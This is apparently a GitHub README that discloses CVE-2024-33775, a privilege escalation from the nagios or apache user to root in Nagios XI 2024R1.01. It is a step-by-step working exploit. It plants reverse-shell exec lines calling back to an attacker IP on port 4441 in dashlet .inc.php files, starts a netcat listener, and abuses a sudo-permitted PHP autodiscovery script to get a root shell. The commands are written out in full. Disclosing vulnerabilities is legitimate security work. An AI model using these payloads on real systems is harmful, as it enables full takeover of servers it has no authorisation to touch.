CVE Discovered by: K. Wahab (Neo`X) 

## Vulnerability Details:

- **Product:**  Nagios XI Version 2024R1.01
- **Vulnerability:** Privilege Escalation from Users "NAGIOS" or "APACHE"
- **Result:** Full root access on the target system
- **CVE:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33775

## Exploit:
RSS Dashlet is used in this example.

### 1. Create a new instance of Nagios XI:
-  You can download the Nagios XI Version 2024R1.01 OVA file from: [https://assets.nagios.com/downloads/nagiosxi/2024/ovf/nagiosxi-2024R1.0.1-64.ova](https://assets.nagios.com/downloads/nagiosxi/2024/ovf/nagiosxi-2024R1.0.1-64.ova)

### 2. Privilege Escalation:
#### Exploit As NAGIOS:
-  Add inside dashlet .inc.php file in "/usr/local/nagiosxi/html/includes/dashlets/" the following content :
  ```
  exec('/bin/bash -i >& /dev/tcp/<Attacker IP>/4441 0>&1);
  ```

-  Start a Netcat listening server on the attacker machine:
  ```
  nc -nlvp 4441
  ```

-  Execute the following command to escalate privileges and receive a connection as root:
  ```
  sudo /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php --addresses=127.0.0.1/1
  ```
#### Exploit As APACHE:
-  Go on the "dashlets" managing page and download a Dashlet:
	```
	http://TARGET_IP/nagiosxi/admin/dashlets.php?download=rss_dashlet
	```
  
-  Modify the *.inc.php:
	```
	exec("sleep 30 && /bin/bash -c '/bin/bash -i >& /dev/tcp/<Attacker IP>/4441 0>&1'");
	```
  ![Dashlet_inc_php](https://github.com/Neo-XeD/CVE-2024-33775/assets/168660736/1c614f1b-11af-4379-8e83-f904d5f9a9c2)

-  Start a Netcat listening server on the attacker machine:
  ```
  nc -nlvp 4441
  ```
-  Upload the malicious dashlet in the dashlets managing page and wait for connection as APACHE user.
-  Execute the following command to escalate privileges and receive a connection as root:
  ```
  sudo /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php --addresses=127.0.0.1/1
  ```
(Note : After executing the command you will receive connection as APACHE, use CTRL+C to exit and restart listener again multiple times)

![Apache_root](https://github.com/Neo-XeD/CVE-2024-33775/assets/168660736/a3a092c4-39ea-483f-a5a4-ab427dcfb565)


